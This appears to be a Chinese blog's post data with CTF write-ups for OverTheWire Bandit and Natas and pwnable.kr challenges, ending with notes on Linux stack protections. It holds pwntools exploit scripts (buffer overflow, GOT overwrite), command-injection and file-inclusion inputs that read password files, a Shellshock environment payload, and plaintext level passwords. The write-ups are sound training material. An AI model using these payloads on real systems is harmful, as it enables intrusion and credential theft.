&lt;morla@overthewire.org&gt;Date: Thu May 7 20:14:52 2020 +0200 add data needed for development #该分支下可能有flagcommit 8e6c203f885bd4cd77602f8b9a9ea479929ffa57Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Thu May 7 20:14:51 2020 +0200 add gif2asciicommit 208f463b5b3992906eabf23c562eda3277fea912Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Thu May 7 20:14:51 2020 +0200 fix usernamecommit 18a6fd6d5ef7f0874bbdda2fa0d77b3b81fd63f7Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Thu May 7 20:14:51 2020 +0200 initial commit of README.mdbandit29@bandit:/tmp/what_a_fuck/repo$ cat README.md #查看READM.md# Bandit NotesSome notes for bandit30 of bandit.## credentials- username: bandit30- password: 5b90576bedb2cc04c86a9e924ce42faf Level_30➡Level_31Learn about the git show1git show-ref #显示所有本地库储存的所有可能的引用以及关联的提醒 1234563aa4c239f729b07deb99a52f125893e162daac9e refs/heads/master3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/HEAD3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/masterf17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secretgit show f171即可get flag47e603bb428404d265f59c42920d81e5 Level_31➡Level_32Learn about push and commit of git1234567bandit31@bandit:/tmp/sanshiyiguan/repo$ cat README.md This time your task is to push a file to the remote repository.Details: File name: key.txt Content: &#x27;May I come in?&#x27; Branch: master 查看信息应该是让我们用master分支把包含’May I come in?’的key.txt提交到远程仓库 vim 编辑该文档然后添加 1git add key.txt -f 关于 commit 1git commit -m &quot;wuhu~I_got_it&quot; The last step: 1git push 12remote: Well done! Here is the password for the next level:remote: 56a9bf19c63d650ce78e6ec0354ee45e Level_32➡Level_33Analyse: 1234&gt;&gt; lssh: 1: LS: not found&gt;&gt; whoamish: 1: WHOAMI: not found 登录后弹出一个大写的SHELL终端，测试发现我们所有的命令都会被转换为大写。 根据Tips: sh 和 man 查阅man sh文档 找到了一些信息，可以用$0 12345Expands to the name of the shell or shell script. This is set at shell initialization. If bash is invoked with a file of commands, $0 is set to the name of that file. If bash is started with the -c option, then $0 is set to the first argument after the string to be executed, if one is present. Otherwise, it is set to the file name used to invoke bash, as given by argument zero. What’s $01In bash, $n (where “n” represents a number), refers to the nth argument of a command call. $1 would be the first parameter, $2 the second, and so forth. $0 refers to the command itself. As we figured out above that our input is passed on to an sh call, $0 will be referencing sh itself, starting a new shell (without the UPPERCASE mechanics). 12$ cat /etc/bandit_pass/bandit33c9c3199ddf4121b10cf581a98d51caee Summary题目非常平易近人，引导着学习基本Linux命令、linux文件、用户管理等、Git命令等知识。","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"Web题解_natas","slug":"Web_1","date":"2021-04-20T01:04:24.027Z","updated":"2021-04-22T01:48:24.188Z","comments":true,"path":"2021/04/20/Web_1/","link":"","permalink":"http://example.com/2021/04/20/Web_1/","excerpt":"","text":"Web题解_natasEasy_web入门刷题 Level_0Check Souce code Level_0➡Level_1Check Souce code Level_1➡Level_2发现有个png图片，访问上级目录可查看到有flag的txt文档 Level_2➡Level_3Robots协议访问/robots.txt查看到存在目录/s3cr3t/访问即可得到flag Level_3➡Level_4根据提示用Burpsuite抓包改HTTPReferer发送即可 Level_4➡Level_5Learn about cookie更改cookie中Loggedin 值为1即可 Level_5➡Level_612345678910&lt;?include &quot;includes/secret.inc&quot;;if(array_key_exists(&quot;submit&quot;, $_POST))&#123;if($secret == $_POST[&#x27;secret&#x27;])&#123;print&quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;;&#125;else&#123;print&quot;Wrong secret&quot;;&#125;&#125;?&gt; 发现导入了”includes/secret.inc” ，比较的时候访问该目录可看到密码，提交即可 Level_6➡Level_7include()文件包含漏洞，用户传入的page参数未经过滤直接调用include()函数，传入/etc/natas_webpass/natas8作为参数即可。 Level_7➡Level_81234567891011121314151617&lt;?$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;function encodeSecret($secret) &#123; return bin2hex(strrev(base64_encode($secret)));&#125;if(array_key_exists(&quot;submit&quot;, $_POST)) &#123; if(encodeSecret($_POST[&#x27;secret&#x27;]) == $encodedSecret) &#123; print &quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;; &#125; else &#123; print &quot;Wrong secret&quot;; &#125;&#125;?&gt; 根据加密过程解密即可 练习一下python 123456789import base64byte=b&#x27;\\x3d\\x3d\\x51\\x63\\x43\\x74\\x6d\\x4d\\x6d\\x6c\\x31\\x56\\x69\\x56\\x33\\x62&#x27;t=byte.decode()print(t)t=t[::-1]#字符切片print(t) t=base64.b64decode(t)print(t) 练习一下linux命令 优雅简洁:) 1echo 3d3d516343746d4d6d6c315669563362 | xxd -p -r | rev | base64 -d -r | -revert reverse operation: convert (or patch) hexdump into binary. If not writing to stdout, xxd writes into its output file without truncating it. Use the combination -r -p to read plain hexadecimal dumps without line number information and without a particular column layout. Additional Whitespace and line-breaks are allowed anywhere. Level_8➡Level_9Learn about passthru()passtru():exec() 函数类似， passthru() 函数也是用来执行外部命令（ command ）的。 用户输入未过滤，直接用 ; 截断grep 命令cat flag 1;cat /etc/natas_webpass/natas10 Level_9➡Level_10注意到对用户输入进行过滤，但只是过滤了; | &amp;特殊字符 Uage of grep and regex1grep &#x27;[A-Za-z]&#x27; 文件名 Demo: 123[a-zA-Z] /etc/natas_webpass/natas11Or. /etc/natas_webpass/natas11 Level_10➡Level_11Level_11➡Level_12Level_12➡Level_13Level_13➡Level_14Level_14➡Level_15Level_15➡Level_16Level_16➡Level_17Level_17➡Level_18Level_18➡Level_19Level_19➡Level_20Level_20➡Level_21Level_21➡Level_22Level_22➡Level_23Level_23➡Level_24Level_24➡Level_25Level_25➡Level_26Level_26➡Level_27Level_27➡Level_28Level_28➡Level_29Level_29➡Level_30**Level_30➡Level_**31Level_31➡Level_32Level_32➡Level_33**Level_33➡Level_**34","categories":[{"name":"Web","slug":"Web","permalink":"http://example.com/categories/Web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"http://example.com/tags/Web/"}]},{"title":"Pwnable_game题解_1","slug":"Pwn_1","date":"2021-04-19T16:59:27.486Z","updated":"2021-04-20T00:51:21.326Z","comments":true,"path":"2021/04/20/Pwn_1/","link":"","permalink":"http://example.com/2021/04/20/Pwn_1/","excerpt":"","text":"Pwnable_games开始刷题啦！冲冲冲！本贴记录主要记录知识点和exp fdTips: main函数的三个参数 int argc int型变量，表示传递给main函数的参数数量。 char *argv 指针数组，每个指针指向各个具体的参数。 char*envp 环境变量，可以为程序运行过程中需要使用环境变量做参考。 Demo: 1$ ./hello //执行该文件 此时argc=1,表示只有一个参数输入 argv只有一个元素,argv[0]指向输入程序路径及名称: ./hello 1$ ./hello para_1 此时argc=2,有两个参数传入 argc[0]指向输入程序路径及名称 “./hello” argv[1]指向para_1字符串 Linux 文件IO部分理解 所有的I/O设备都被模型化为文件，而所有的输入和输出都被当做相应文件的读和写来执行。这种将设备优雅映射为文件的方式，允许Linux内核引出一个简单、低级的应用接口，称为Unix I/O，这使得所有输入和输出都能以一种统一、一致的方式来执行： 打开文件 ： 应用程序通过内核打开相应文件，内核返回一个小的非负整数，叫做描述符，它在后续对此文件的所有操作中标识这个文件。内核记录有关打开文件的所有信息。应用程序只需记住这个描述符。 文件描述符fd： 文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。 Linux shell创建的每个进程开始时都有三个打开的文件： 12345stdin 标准输入的文件标识符为0 stdout 标准输出的文件标识符为1stderr 标准错误输出的文件标识符为2 Exp: 1234567891011#coding=utf-8from pwn import *payload=str(0x1234)shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;fd&#x27;,password=&#x27;guest&#x27;,port=2222)#shell.download_file(&#x27;fd.c&#x27;)sh = shell.run(&#x27;./fd&#x27;+&#x27; &#x27;+payload)payload=&quot;LETMEWIN&quot;sh.sendline(payload)sh.interactive() collisionTips: 跟哈希相关不大（× 可能是我没有get到出题人的意思 思路很简单，用hashcode的值除以5，再依次加起来就好了。0x21DD09EC的十进制表示是568134124，它并不能被5整除，所以我们用一个小技巧，先加1，再除以5，最后将其中一个数值再减1即可。 具体计算方法为： 12(568134124 + 1) / 5 = 113626825 = 0x6C5CEC90x21DD09EC = 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC8 那么argv[1]的字符串，就应该是一个由相应十六进制数值组成的字符串，表示如下： 1\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06 这里采用小端存储方式。 小端存储：高字节保存在内存高地址，低字节保存在内存低地址中 这个解释依旧十分笼统，为什么int型数据以小端存储就要每个int型数据逆序输入 下面两张图说明问题：（×其实还并不能说明问题 但是我们并不知道输入的命令行参数在内存存储的增长方向😀 各种Google均无果。。无奈下手动测试一下。 Test Code: 12345678910 #include&lt;stdio.h&gt; int main(int argc,char* argv[],char* env[]) &#123;for(int i=0;i&lt;=2;i++) printf(&quot;argv[%d]:%p\\n&quot;,i,argv[i]); int i=0; printf(&quot;stack:%p\\n&quot;,&amp;i); printf(&quot;env:%p\\n&quot;,env[i]); return 0; &#125; 实践出真知: 输入的argv[1]存储在栈上和内核空间之间，并且由低地址向高地址增长。 那么就很容易明白为什么逆序输入int四个字节了。 以为0x6C5CEC9和0x6C5CEC8为例 我们传入命令行参数argv[1]对应的字节序列为 \\xc9\\xce\\xc5\\x06\\x12\\x34\\x56\\x78实际存储时如下方式存储如下： 高地址8 78高地址7 56高地址6 34高地址5 12高地址4 06高地址3 c5高地址2 ce高地址1 c9 int型号指针ip指向高地址1 那么由于int型号为小端存储，四个字节依次读取 ip[i]=0x06C5CEC9 ip[2]=0x78563412 网上大部分解析只是简单说明int数据小端存储，但是单单知道这个是不足以得出逆序输入的结论，必须知道命令行参数存储结构。 以上内容原创。转载注明出处。 PS：部分字节没有对应ASCII码，我们需要直接向argv[1]中写入字节，可以用python实现 Demo: 1`python -c print &#x27;\\xAB\\xCD&#x27;` Exp: 12345678#coding=utf-8from pwn import *payload=p32(0x6c5cec9)*4+p32(0x6c5cec8)shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;col&#x27;,password=&#x27;guest&#x27;,port=2222)sh = shell.run(&#x27;./col&#x27;+&#x27; &#x27;+payload)sh.interactive() bofAnalyse: get简单的溢出 IDA静态查看arg[1]和数组key对应的VA地址，计算出偏移为0x52 Exp: 1234567#coding=utf-8from pwn import *io=remote(&quot;pwnable.kr&quot;,9000)payload=&#x27;a&#x27;*(0x2c+0x8)+p32(0xcafebabe)io.sendline(payload)io.interactive() flagAnalyse: IDA静态分析发现里面内容少得可怜..很明显是加壳了 这里需要用到strings命令，一个技巧可以获得关键的信息： 1strings -20 flag 显示flag文件中至少包含20个字符的字符串，定位关键信息： 1Info: This file is packed with the UPX executable packer http:&#x2F;&#x2F;upx.sf.net Google后简单了解了一下upx ，是个压缩壳 upx -d 解压一下即可 然后字符搜索关键词字 :) #注意此处需要转义字符 1strings flag |grep \\:\\) passcodesouce code: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\\n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;//这个条件一旦成立就可以pwn printf(&quot;Login OK!\\n&quot;); system(&quot;/bin/cat flag&quot;); &#125; else&#123; printf(&quot;Login Failed!\\n&quot;); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\\n&quot;, name);&#125;int main()&#123; printf(&quot;Toddler&#x27;s Secure Login System 1.0 beta.\\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\\n&quot;); return 0;&#125; key points: scanf函数: scanf(&quot;%d&quot;, passcode1); 缺少一个&amp;这时函数执行时，会将passcode1作为地址进行写入操作，同理对应passcode2一样。一旦这两个不可控的地址是不可写或访问的，那么程序就crash了。 那么对passcode1和2地址的构造，然后利用scanf函数在该地址进行写入数据会是关键。 Analyse： 函数流程分析 welcome:可以在name数组中写入长度位100字节的字符 接下来无缝执行 login： 对passcode1地址上进行写入数据 ➡ 调用fflush(stdin); ➡ 输入passcode2 ➡check为真后输出flag 由于welcome()和login()这两个函数之间执行期间没有其他操作，可以分析得出前后进入这两个栈帧时，他们的EBP是一样的，自然可以想到我们可以领用name数组对passcode1和passcode2进行覆盖。 IDA静态分析： name数组数组的地址为：EBP-70H passcode1地址: EBP-10H passcode2地址: EBP-0cH welcome（）和login（）这两个函数栈帧的EBP一样只是我们的猜测，我们可以用gdb动态调试验证查看是否确实相同。 下载ELF文件： 1234#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;passcode&#x27;,password=&#x27;guest&#x27;,port=2222)shell.download_file(&quot;./passcode&quot;) 修改权限 1chmod 777 passcode 查看内存保护信息： 1checksec passcode 此处的RELRO信息为关键点，关于checksec 查看内存保护信息参阅这篇： linux内存保护信息 gdb动态调试： 查看验证：确实两个函数栈帧的EBP相同，那么自然想到可以利用name数组对passcode1和2进行覆盖，但是注意到数组name大小是100字节，name首地址到passcode1首地址距离为96，我们组多能利用name数组的最后四个字节覆盖passcode1，无法覆盖到passcode2 注意到输入passcode1后，立即执行了 fflush(stdin) 【用于更新缓冲区】函数，调用这个函数的时候会利用linux的动态延迟加载。 此处需要恶补一下GOT和PLT表的关系以及linux动态延迟加载的一些只是： 参考这篇非常详细 参阅完毕后就可以进行exp Hijack GOT： 修改某个被调用函数的地址，让其指向另一个函数 这里我们修改调用fflush的地址，改为cat flag指令的地址，然后成功执行cat flag指令得到flag。 最后要做的就是找到调用fflush的地址和cat flag的地址，然后用name数组对passcode1覆盖为fflush的GOT表项地址，然后用scanf函数对GOT表象覆写为输出flag的指令即可。 找到fflush的GOT表项地址: 0x0804a004 找到cat flag 指令地址为：0x080485E3 Exp： 1234567891011#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;passcode&#x27;,password=&#x27;guest&#x27;,port=2222)sysh_addr=0x080485E3fflush_got=0x0804a004payload=&quot;a&quot;*(100-4)+p32(fflush_got)sh=shell.run(&#x27;./passcode&#x27;)sh.sendlineafter(&quot;enter you name :&quot;,payload)payload=str(sysh_addr)sh.sendlineafter(&quot;enter passcode1 :&quot;,payload)sh.interactive() random一个C语言的知识点：如果用户在rand()之前没有调用过sand(),那么系统默认将1作为伪随机数的初始值，如果给定了一个值，那么每次rand()产生的随机数序列都是一样的。 EXP 12345678#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;random&#x27;,password=&#x27;guest&#x27;,port=2222)payload=str(3039230856)sh=shell.run(&#x27;./random&#x27;)sh.sendline(payload)sh.interactive() input主要考察linux的一些基本参数传递，这里就当做学习python的一些模块。。 subprocess模块 Demo: 1subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None) args：表示要执行的命令。必须是一个字符串，字符串参数列表。 stdin、stdout 和 stderr：子进程的标准输入、输出和错误。其值可以是 subprocess.PIPE、subprocess.DEVNULL、一个已经存在的文件描述符、已经打开的文件对象或者 None。subprocess.PIPE 表示为子进程创建新的管道。subprocess.DEVNULL 表示使用 os.devnull。默认使用的是 None，表示什么都不做。另外，stderr 可以合并到 stdout 里一起输出。 timeout：设置命令超时时间。如果命令执行时间超时，子进程将被杀死，并弹出 TimeoutExpired 异常。 check：如果该参数设置为 True，并且进程退出状态码不是 0，则弹 出 CalledProcessError 异常。 encoding: 如果指定了该参数，则 stdin、stdout 和 stderr 可以接收字符串数据，并以该编码方式编码。否则只接收 bytes 类型的数据。 shell：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。 os模块 该模块提供了一些方便使用操作系统相关功能的函数。 fdopen()函数：创建文件对象 os.fdopen(fd, **args,**kwargs):返回打开文件描述符 fd 对应文件的对象。类似内建 open() 函数，二者接受同样的参数。不同之处在于 fdopen() 第一个参数应该为整数。 open()函数： 打开文件对象 file 是一个 path-like object，表示将要打开的文件的路径（绝对路径或者当前工作目录的相对路径），也可以是要被封装的整数类型文件描述符。（如果是文件描述符，它会随着返回的 I/O 对象关闭而关闭，除非 closefd 被设为 False 。） open(file, mode=’r’, buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None) mode 是一个可选字符串，用于指定打开文件的模式。默认值是 &#39;r&#39; ，这意味着它以文本模式打开并读取。其他常见模式有：写入 &#39;w&#39; （截断已经存在的文件）；排它性创建 &#39;x&#39; ；追加写 &#39;a&#39; （在 一些 Unix 系统上，无论当前的文件指针在什么位置，所有 写入都会追加到文件末尾）。在文本模式，如果 encoding 没有指定，则根据平台来决定使用的编码：使用 locale.getpreferredencoding(False) 来获取本地编码。（要读取和写入原始字节，请使用二进制模式并不要指定 encoding。）可用的模式有： 字符 含义 &#39;r&#39; 读取（默认） &#39;w&#39; 写入，并先截断文件 &#39;x&#39; 排它性创建，如果文件已存在则失败 &#39;a&#39; 写入，如果文件存在则在末尾追加 &#39;b&#39; 二进制模式 &#39;t&#39; 文本模式（默认） &#39;+&#39; 更新磁盘文件（读取并写入） 默认的模式是 &#39;r&#39; （打开并读取文本，同 &#39;rt&#39; ）。对于二进制写入， &#39;w+b&#39; 模式打开并把文件截断成 0 字节； &#39;r+b&#39; 则不会截断。 os.pipe() 创建一个管道，返回一对分别用于读取和写入的文件描述符 (r, w)。 Demo: 123456789101112131415161718192021222324252627282930#!/usr/bin/python# -*- coding: UTF-8 -*-import os, sysprint &quot;The child will write text to a pipe and &quot;print &quot;the parent will read the text written by child...&quot;# file descriptors r, w for reading and writingr, w = os.pipe() processid = os.fork()if processid: # This is the parent process # Closes file descriptor w os.close(w) r = os.fdopen(r) print &quot;Parent reading&quot; str = r.read() print &quot;text =&quot;, str sys.exit(0)else: # This is the child process os.close(r) w = os.fdopen(w, &#x27;w&#x27;) print &quot;Child writing&quot; w.write(&quot;Text written by child...&quot;) w.close() print &quot;Child closing&quot; sys.exit(0) socket模块 这个模块提供了访问BSD套接字的接口。在所有现代Unix系统、Windows、macOS和其他一些平台上可用。 这个Python接口是用Python的面向对象风格对Unix系统调用和套接字库接口的直译：函数socket() 返回一个 套接字对象 ，其方法是对各种套接字系统调用的实现。形参类型一般与C接口相比更高级：例如在Python文件 read() 和 write() 操作中，接收操作的缓冲区分配是自动的，发送操作的缓冲区长度是隐式的。 Demo: 1socket.socket(socket_family,socket_type,protocal=0) family: 套接字家族可以使 AF_UNIX 或者 AF_INET。 type: 套接字类型可以根据是面向连接的还是非连接分为 SOCK_STREAM 或 SOCK_DGRAM。 protocol: 一般不填默认为 0。 socket_family参数： 1.基于文件类型的套接字家族 套接字家族的名字：AF_UNIX，unix一切皆文件，基于文件的套接字调用的就是底层的文件系统来取数据，两个套接字进程运行在同一机器，可以通过访问同一个文件系统间接完成通信。 2.基于网络类型的套接字家族 套接字家族的名字：AF_INET，还有AF_INET6被用于ipv6，还有一些其他的地址家族，不过，他们要么是只用于某个平台，要么就是已经被废弃，或者是很少被使用，或者是根本没有实现，所有地址家族中，AF_INET是使用最广泛的一个，python支持很多种地址家族，但是由于我们只关心网络编程，所以大部分时候我么只使用AF_INET。 type指的是套接字类型，常用的类型有： SOCK_STREAM（TCP流） SOCK_DGRAM（UDP数据报） SOCK_RAW（原始套接字）最后一个 “protocol”一般设置为“0”，也就是当确定套接字使用的协议簇和类型时，这个参数的值就为0，但是有时候创建原始套接字时，并不知道要使用的协议簇和类型，也就是domain参数未知情况下，这时protocol这个参数就起作用了，它可以确定协议的种类。 socket是一个函数，那么它也有返回值，当套接字创建成功时，返回套接字，失败返回“-1”，错误代码则写入“errno”中。 一些socket函数: socket.connect(adress): 连接到 address 处的远程套接字。address 的格式取决于地址簇) socket.send(bytes[,flags]) 发送数据给套接字。本套接字必须已连接到远程套接字。 socket.close(fd) 关闭一个套接字文件描述符。它类似于os.close()，但是专用于套接字 Exp: 在/temp文件夹发现的python写的exp… 123456789101112131415161718192021222324252627282930313233343536373839#argc=100#argv[&#x27;A&#x27;]=&#x27;x00&#x27;#argv[&#x27;B&#x27;]=&#x27;\\x20\\x0a\\x0d&#x27;argc = list(&#x27;A&#x27;) * 100argc[ord(&#x27;A&#x27;)] = &#x27;&#x27;argc[ord(&#x27;B&#x27;)] = b&#x27;\\x20\\x0a\\x0d&#x27; #set socket portargc[ord(&#x27;C&#x27;)] = &quot;5555&quot;argc[0] = &#x27;/home/input2/input&#x27;#2import osstdin_r, stdin_w = os.pipe()stderr_r, stderr_w = os.pipe()os.write(stdin_w, b&#x27;\\x00\\x0a\\x00\\xff&#x27;)os.write(stderr_w, b&#x27;\\x00\\x0a\\x02\\xff&#x27;)#3environ = &#123;b&#x27;\\xde\\xad\\xbe\\xef&#x27; : b&#x27;\\xca\\xfe\\xba\\xbe&#x27;&#125;#4f = open(b&#x27;\\x0a&#x27;,&#x27;wb&#x27;)f.write(b&#x27;\\x00\\x00\\x00\\x00&#x27;)f.close()import subprocessimport timesh = subprocess.Popen(argc, stdin = stdin_r, stderr = stderr_r, env = environ)time.sleep(2)#5import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((&#x27;127.0.0.1&#x27;,5555))s.send(b&#x27;\\xde\\xad\\xbe\\xef&#x27;)s.close() 另外一个Tips： t权限（粘着位SBIT）：任何人在该目录下有写权限，但是普通用户不能删除别人的文件 查看到tmp目录下普通用户有-wt权限，我们进入tmp目录后创建自己的一个目录然后执行a.py 注意到当前目录下并没有flag，我们需要创建软连接 1ln /home/input/flag flag legARM汇编： 这篇一步到位。点我 1234567891011(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump. 1.返回值存储在r0寄存器 ARM处理器有两种工作状态：ARM状态和Thumb状态。处理器可以在两种状态下随意切换。 处于ARM状态时，执行32位字对齐的ARM指令。 处于Thumb状态时，执行16位对齐的Thumb指令。 2.两种工作状态： ARM 和 Thumb 指令集的动态切换，是通过 BX 指令使用一个寄存器名作为参数来完成。程序控制权被转交给该寄存器中存储的地址 ( LSB 位被屏蔽 )。 如果 LSB=1, 则进入 Thumb 指令处理模式； 如果 LSB=0, 则进入 ARM 指令处理模式。 通俗点讲其实就是BX 跳转的地址最低位为1还是0来判断是进入Thumb指令处理模式还是进人ARM指令处理模式 3.Thumb模式下PC值=当前指令地址值+8 key1=0x00008cdc+8 1234567891011121314151617(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push &#123;r6&#125; ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 ;此时r6最后一位是1,进入ARM thumb模式 pc&#x3D;adress+4 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push &#123;r3&#125; 0x00008d0a &lt;+26&gt;: pop &#123;pc&#125; 0x00008d0c &lt;+28&gt;: pop &#123;r6&#125; ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump. 这里返回值由r3传入。然后再看一下地址 0x00008d00 &lt;+16&gt;这里，有个bx r6，而r6等于pc+1即0x8d05，最低为为1，所以执行bx r6之后会进入thumb模式，这样就会变成2字节对齐，pc存储着当前指令加4的位置，如此一来，下面的mov r3,pc中，r3等于0x8d04+0x4。下一条为adds r3，#4，表示r3 = r3 + 4后更新标志位，因此r3 = 0x8d04 + 0x4 + 0x4。 key2=0x8d04 + 0x4 + 0x4 123456789101112(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump. 最终key3=lr的值 lr寄存器也即R14寄存器，用作子程序链接，称为链接寄存器LK (Link Register)。 作用：使用BL或BLX时，跳转指令自动把返回地址放入r14中；子程序通过把r14复制到PC来实现返回 在main函数找到调用key时的代码 120x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt;0x00008d80 &lt;+68&gt;: mov r3, r0 BL指令： B或BL指令引起处理器转移到“子程序名”处开始执行。两者的不同之处在于:(1)BL指令在转移到子程序执行之前，将其下一条指令的地址拷贝到R14（LR,链接寄存器）。 由于BL指令保存了下条指令的地址，因此使用指令“MOV PC ,LR”即可实现子程序的返回。(2)B指令则无法实现子程序的返回，只能实现单纯的跳转。用户在编程的时候，可根据具体应用选用合适的子程序调用语句。 key3=0x8d80 三个数相加即可 Exp: 108400 mistake符号优先级相关 1if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)) 比较运算符优先级高于赋值运算符，因此实际上fd最终并不是理想的文件描述符，而是0才对，而另一方面，0作为文件描述符，它指向的是stdin。 两个输入都由我们构造，自由发挥即可。。 Exp: 1234567891011#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;mistake&#x27;,password=&#x27;guest&#x27;,port=2222)sh=shell.run(&#x27;./mistake&#x27;)payload=&#x27;B&#x27;*10sh.sendafter(&quot;do not bruteforce...\\n&quot;,payload)payload=&#x27;C&#x27;*10sh.sendafter(&quot;input password : &quot;,payload)sh.interactive() shellshockCVE-2014-6271（破壳漏洞）面向Google解题 Link Exp: 12345678#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;shellshock&#x27;,password=&#x27;guest&#x27;,port=2222)sh=shell.run(&#x27;sh&#x27;)sh.sendline(&quot;env x=&#x27;() &#123; :;&#125;; bash -c \\&quot;cat flag\\&quot; &#x27; ./shellshock&quot;)sh.interactive() coin1blackjacklottocmd1cmd2uafmemcpyasmunlinkblukathorcruxes","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"Linux程序保护机制","slug":"Linux程序保护机制","date":"2021-04-17T18:32:31.798Z","updated":"2021-04-17T18:48:23.671Z","comments":true,"path":"2021/04/18/Linux程序保护机制/","link":"","permalink":"http://example.com/2021/04/18/Linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/","excerpt":"","text":"Linux程序保护机制​ 在Pwnable.kr刷题的过程中一点一点地了解了linux系统下的一些安全机制来降低程序受到溢出等攻击，这里简单做个总结。:) Tools:checksecchecksec是一个检查linux程序开启的安全机制的shell脚本，也可以检测packer信息 （Demo: 题目:flag 下面对逐个介绍保护机制 CANARY​ 在linux程序中，CANARY是一种栈保护机制，栈保护机制开启后，函数执行时会先往栈中插入随机值，这个随机值就被称为CANARY，当函数返回时，会先验证这个随机数是否被更改，如果被更改说明有栈溢出行为，就会使程序强制停止，从而规避栈溢出带来的危害。 ​ Function： 1、在所有函数调用发生时，向栈帧内压入一个额外的随机 DWORD，这个随机数被称作“canary”，用 IDA 反汇编时，又被称作“Security Cookie”。 2、canary 位于 EBP 之前，系统还会在.data 的内存区域中存放一个 canary 的副本。 3、 当栈中发生溢出时，canary 将被首先淹没，之后才是 EBP 和返回地址。 4、 在函数返回之前，系统将执行一个额外的安全验证操作，称作 Security Check。 5、在 Security Check 过程中，系统将比较栈帧中原先存放的 canary 和.data 中副本的值，若两者不同，则说明栈中发生了溢出，系统将进入异常处理流程，函数不会正常返回。 